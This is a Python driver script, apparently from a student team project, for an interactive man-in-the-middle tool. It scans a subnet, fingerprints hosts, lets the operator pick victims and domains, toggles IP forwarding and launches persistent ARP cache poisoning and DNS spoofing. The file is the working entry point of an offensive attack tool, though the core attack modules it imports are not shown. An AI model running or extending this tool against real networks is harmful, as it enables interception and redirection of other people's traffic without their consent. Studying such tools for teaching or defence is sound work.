#!/usr/bin/env python3

"""Schoolbook_RSA.py: ARP & DNS --- By Team Schoolbook_RSA."""
 
import os #For executing bash commands
import sys #Executing system calls
from threading import Thread #import thread to create multiple threads


import settings #Import global variables used across files

from arppoisoning import * #Import modules for ARP Cache Poisoning
from constants import * #Import used constants
from dnsspoofing import * #Import modules for DNS Spoofing
from handlers import * #Import modules containing the InputHandler
from networkreconnaissance import * #Import modules for network reconnaissance
from safeoperations import * #Import thread safe operations

settings.init() #Initialize globals used across files

ih = InputHandler()

#Introduction, also checks if program is executed as root and prints forward warning
def intro():
	if os.geteuid() != 0:
		sys.exit('\nThis program requires elevated privileges.\nPlease execute as root user.\nExiting...\n')

	print('Welcome to this Persistent ARP Cache Poisoning and DNS Spoofing program.')
	print(FORWARD_WARNING)

#Prints table of active hosts with format: ID | IPv4 | MAC | OS | Device Type | Open TCP Ports 
def printHostTable(hosts):
	tableTemplate = "{0:4}|{1:18}|{2:20}|{3:35}|{4:20}|{5}"
    
	#Print table of active hosts
	print(tableTemplate.format('ID', 'IPv4', 'MAC', 'Operating System', 'Device Type', 'Open TCP Ports'))

	for i in range(len(hosts)):
		print(tableTemplate.format(str(i), hosts[i]['IP'], hosts[i]['MAC'], 
			hosts[i]['Fingerprint']['OS'], hosts[i]['Fingerprint']['Type'],
			 ', '.join(map(str, hosts[i]['Fingerprint']['OpenTCP'])) if hosts[i]['Fingerprint']['OpenTCP'] else 'N/A'))

#Prints table of selected ARP victims with format: ID | Victim IPv4 | Victim MAC
def printVictimTableARP(arpTuples):
	tableTemplate = "{0:4}|{1:18}|{2:20}"

	print(tableTemplate.format('ID', 'Victim IPv4', 'Victim MAC'))

	for i in range(len(arpTuples)):
		print(tableTemplate.format(str(i), arpTuples[i]['VIP'], arpTuples[i]['VMAC']))

#Gets list of interfaces and lets user choose one
def getInterface():
    allIDs = []
    ifaceList = getAvailableInterfaceList()

    print('Found the following network interfaces:')
    print('ID\t|Interface Name')

    for i in range(len(ifaceList)):
    	allIDs.append(str(i))
    	print(str(i) + '\t|' + ifaceList[i])

    return ih.interfaceChoice(allIDs, ifaceList)

#Asks user to specify the attack tuples used for the ARP Cache Poisoning attack
#Format of single ARP attack tuple: {'VIP' : victimIP, 'VMAC': victimMAC, 'SIP' : spoofIP}
def getAttackTuplesARP(iface, activeHosts):
	attackTuples = []
	allIDs = list(map(str, range(len(activeHosts)))) #List of all IDs given to active host in activeHosts
	remainingIDs = list(map(str, range(len(activeHosts)))) #List of IDs of hosts that are available for selection (as a victim). A host cannot be picked twice. 

	#Print out active hosts on the network
	print('\nDiscovered active hosts on subnet of interface ' + iface + ':')
	printHostTable(activeHosts)

	#At least one attack tuple is needed to perform the attack
	while not attackTuples:
		#Get attack tuples from input
		attackTuples = ih.arpTuplesChoice(iface, activeHosts)

		if not attackTuples:
			print('No ARP attack combination (i.e., victim and spoofed host) specified. Try again.')	

	return attackTuples

#Asks user to specify the attack tuples used for DNS Spoofing.
#The victims of DNS Spoofing have to be ARP Cache Poisoned.
#Format of single DNS attack tuple: {'VIP' : victimIP, 'Domains' : [domainName1, domainName2, ...]}
def getAttackTuplesDNS(arpTuples):
	attackTuples = []

	print(DNS_EXPLANATION)
	print('The following is a table of the selected ARP Cache Poisoning victims:')
	printVictimTableARP(arpTuples)

	#At least one attack tuple is needed to perform the attack
	while not attackTuples:
		#Get attack tuples from input
		attackTuples = ih.dnsTuplesChoice(arpTuples)

		if not attackTuples:
			print('No DNS attack combination (i.e., victim host, domains to spoof) specified. Try again.')	

	return attackTuples

def main():
	attackTuplesARP = [] #List of tuples used to execute for ARP Cache Poisoning
	attackTuplesDNS = [] #List of tuples used to execute for DNS Spoofing

	#introduction
	intro()

	#Gets interface to work with
	iface = getInterface()
	
	#Ask ARP or ARP & DNS
	alsoDNS = ih.attackChoice()

	#Ask user to choose between network reconnaissance to find active hosts or manual input of victim IPv4
	manual = ih.arpMethodChoice()

	if manual:
		attackTuplesARP = ih.arpTuplesChoiceManual(iface)
	else: #Not manual
		#Get currently active hosts (format: [{'IP' : IP1, 'MAC' : MAC1}, {'IP' : IP2, 'MAC' : MAC2}, ...]) on subnet 
		activeHosts = arpingSubnet(iface)

		#Need at least one active host in order to perform attack (as you need a victim for attack)
		if activeHosts:
			#If so desired, fingerprint active hosts 
			#Format: [{'IP' : IP1, 'MAC' : MAC1, 'Fingerprint' : {'OS' : os1, 'Type' : type1, 'OpenTCP' : openTCPports1}], ...])
			activeHosts = ih.fingerprintActiveHosts(activeHosts)

			#Get arp attack tuples based on active hosts
			attackTuplesARP = getAttackTuplesARP(iface, activeHosts)
		else:
			print('Currently, there are not enough active hosts on your network to perform the attack. Try again later.')

	if alsoDNS:
		#Get dns attack tuples based on specified arp attack tuples
		#Format : {'VIP : victimIP (from ARP), 'SMAC' : spoofMAC (from ARP), 'DomainTuples' : {IPToSpoofTo1 : [domain1, domain2], IPToSpoofTo2 : [domain3, domain4], ...} }
		attackTuplesDNS = getAttackTuplesDNS(attackTuplesARP)

		#Disable IPv4 Forwarding
		print('\nDisabling operating system\'s IPv4 forwarding...\n')
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
		print('Operating system\'s IPv4 forwarding succesfully disabled.')

		#Create deamon thread
		dnsThread = Thread(target=executeSpoofingDNS, args=(iface, attackTuplesDNS, attackTuplesARP, ))
		dnsThread.setDaemon(True)

		print('\nInitiating DNS Spoofing.\n')
		dnsThread.start()
		print('DNS Spoofer succesfully initiated.')
	else:
		#Enable or disable IPv4 forwarding, depending on user's choice
		enableForward = ih.allowIPForward()

		os.system('echo ' + enableForward + ' > /proc/sys/net/ipv4/ip_forward')

		if enableForward == '0':
			print('Operating system\'s IPv4 forwarding succesfully disabled.')
		else:
			print('Operating system\'s IPv4 forwarding succesfully enabled.')
	

	executePersistentPoisoningARP(iface, attackTuplesARP, alsoDNS)

	#Exit, also kills DNS thread. 
	sys.exit('Exiting...')

main()